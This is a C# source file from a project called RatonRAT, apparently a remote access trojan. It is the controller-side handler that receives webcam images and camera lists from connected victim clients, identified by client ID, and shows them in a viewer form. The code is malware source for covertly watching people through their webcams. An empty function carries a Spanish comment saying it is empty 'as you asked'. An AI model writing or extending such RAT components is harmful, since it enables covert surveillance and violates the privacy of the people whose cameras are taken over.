using Stuff;
using RatonRAT.ClientForms;
using Server.Connection;
using System.Windows.Forms;
using System.IO;
using System;
using System.Drawing;

namespace Server.Handlers
{
    internal class HandleWebcam
    {
        public HandleWebcam(SillyClient SillyClient, Unpack unpack)
        {
            string formname = "Webcam | Client ID: ";
            FormWebcam webcamForm = (FormWebcam)Application.OpenForms[formname + unpack.GetAsString("UID")];

            if (webcamForm != null && !webcamForm.IsDisposed)
            {
                if (webcamForm.SillyClient == null)
                {
                    webcamForm.SillyClient = SillyClient;
                }

                switch (unpack.GetAsString("Command"))
                {
                    case "Start":
                        webcamForm.Invoke(new MethodInvoker(() =>
                        {
                            byte[] imageBytes = unpack.GetAsByteArray("Image");
                            ProcessImage(imageBytes, webcamForm);
                        }));
                        break;
                    case "List":
                        {
                            webcamForm.Invoke(new MethodInvoker(() =>
                            {
                                string[] cams = unpack.GetAsStringArray("Cams");

                                if (cams != null && cams.Length > 0)
                                {
                                    webcamForm.comboBox1.Items.Clear();

                                    foreach (string cam in cams)
                                    {
                                        webcamForm.comboBox1.Items.Add(cam);
                                    }
                                }
                            }));
                            break;
                        }

                    default:
                        break;
                }
            }
        }

        private void ProcessImage(byte[] imageBytes, FormWebcam webcamForm)
        {
            if (imageBytes != null)
            {
                Image image = GetImageFromBytes(imageBytes);
                if (image != null && webcamForm.pictureBox1 != null && !webcamForm.pictureBox1.IsDisposed)
                {
                    webcamForm.pictureBox1.Image = image;
                    webcamForm.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
                }
                webcamForm.label3.Visible = false;
            }
        }

        private Image GetImageFromBytes(byte[] imageBytes)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream(imageBytes))
                {
                    return System.Drawing.Image.FromStream(ms);
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        private void BlankFunction()
        {
            // Esta función está vacía como pediste
        }
    }
}
